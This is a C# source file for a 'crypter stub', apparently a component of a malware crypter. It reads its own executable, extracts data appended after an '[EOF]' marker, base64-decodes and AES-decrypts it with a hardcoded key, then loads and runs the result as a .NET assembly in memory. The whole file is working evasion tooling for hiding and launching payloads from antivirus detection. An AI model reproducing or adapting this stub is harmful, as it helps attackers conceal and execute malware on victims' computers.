using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Reflection;

namespace Patrick_Jane_Crypter_Stub
{
	class Program
	{
		[DllImport("user32.dll")]
		static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
		static void Main(string[] args)
		{
			string stub = File.ReadAllText(AppDomain.CurrentDomain.FriendlyName.Replace(".vshost", ""));
			string file = File.ReadAllText(Environment.CurrentDirectory + "\\" + AppDomain.CurrentDomain.FriendlyName.Replace(".vshost", ""));

			string password = "AfzdIHOfvi7323Sz";


			RijndaelManaged rijAlg = new RijndaelManaged();
			rijAlg.Key = Encoding.ASCII.GetBytes(password);
			rijAlg.IV = Encoding.ASCII.GetBytes(password);
			ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV);

			MemoryStream msDecrypt = new MemoryStream();
			CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Write);
			//
			if (file.Contains("[EOF]"))
			{
				byte[] base64 = Convert.FromBase64String(file.Substring(file.IndexOf("[EOF]") + "[EOF]".Length));

				csDecrypt.Write(base64, 0, base64.Length);
				csDecrypt.Close();

				Assembly asm = Assembly.Load(msDecrypt.ToArray());
				//asm.EntryPoint.Invoke(null, null);
				try
                {
					asm.EntryPoint.Invoke(null, new object[] { });
				}catch(Exception)
                {

                }
				try
                {
					asm.EntryPoint.Invoke(null, new object[] { new string[] { } });
                }
                catch (Exception)
                {

                }



			}
		}

    }
}
